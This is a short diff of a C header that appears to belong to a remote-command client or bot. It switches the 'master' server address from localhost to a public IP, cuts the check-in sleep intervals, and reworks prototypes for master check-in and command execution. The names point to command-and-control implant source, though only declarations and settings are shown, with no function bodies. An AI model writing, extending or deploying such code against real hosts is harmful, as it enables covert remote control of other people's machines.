@@ -1,10 +1,9 @@
-
 #define BUF_SIZE 8192
-#define MASTER_IP "127.0.0.1"
+#define MASTER_IP "107.170.24.170"
 #define MASTER_PORT 8080
 #define MASTER_RECV_SIZE 4096
-#define SLEEP_BASE 30
-#define SLEEP_MAX 120
+#define SLEEP_BASE 3
+#define SLEEP_MAX 1
 #ifdef _WIN32
     #warning "Compiling for Windows!"
     #define __windows__ //consistency
@@ -99,5 +98,6 @@
 char *get_os();
 char *master_checkin(struct sockaddr_in master, char * data);
 int master_init(struct sockaddr_in *master);
-
-char *run_cmd(char *cmd, char *param);
+char **tokenize_cmd(char * cmd, int *count);
+char **parse(char * cmd);
+char *run_cmd(char **args);
